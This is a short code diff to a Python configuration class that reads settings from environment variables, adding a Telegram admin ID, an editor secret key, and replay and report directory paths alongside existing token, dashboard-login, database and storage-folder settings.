@@ -17,13 +17,17 @@ def _i(k, d):
 class Config:
     TG_TOKEN = os.environ.get("TG_TOKEN", "")
     TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
+    TELEGRAM_ADMIN_ID = os.environ.get("TELEGRAM_ADMIN_ID", "")
     DASH_USER = os.environ.get("DASH_USER", "admin")
     DASH_PASS = os.environ.get("DASH_PASS", "admin123")
     SECRET_KEY = os.environ.get("SECRET_KEY", "change-me-1")
     JWT_SECRET = os.environ.get("JWT_SECRET", "change-me-2")
+    EDITOR_SECRET_KEY = os.environ.get("EDITOR_SECRET_KEY", "")
     DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///" + str(BASE_DIR / "data" / "capture.db"))
 
     UPLOAD_DIR = os.environ.get("UPLOAD_DIR", str(BASE_DIR / "data" / "uploads"))
+    REPLAY_DIR = os.environ.get("REPLAY_DIR", str(BASE_DIR / "data" / "replays"))
+    REPORT_DIR = os.environ.get("REPORT_DIR", str(BASE_DIR / "data" / "reports"))
     SCREENSHOT_DIR = os.environ.get("SCREENSHOT_DIR", str(BASE_DIR / "data" / "screenshots"))
     BURST_DIR = os.environ.get("BURST_DIR", str(BASE_DIR / "data" / "burst"))
     KEYS_DIR = os.environ.get("KEYS_DIR", str(BASE_DIR / "data" / "keys"))
